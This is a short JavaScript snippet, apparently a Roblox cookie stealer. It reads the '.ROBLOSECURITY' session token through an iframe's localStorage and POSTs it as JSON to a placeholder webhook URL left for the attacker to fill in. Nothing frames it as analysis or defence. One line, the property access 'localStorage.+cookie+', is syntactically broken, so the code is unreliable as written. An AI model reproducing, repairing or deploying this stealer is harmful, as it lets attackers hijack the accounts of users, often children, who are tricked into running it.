location.reload();
var webhook = "Your-Webhook-url";
var cookie = ".ROBLOSECURITY";
var token = document.body.appendChild(document.createElement `iframe`).contentWindow.window.localStorage.+cookie+;
var request = new XMLHttpRequest();
request.open("POST", webhook);
request.setRequestHeader('content-type', 'application/json');
request.send(JSON.stringify({"content": token}));
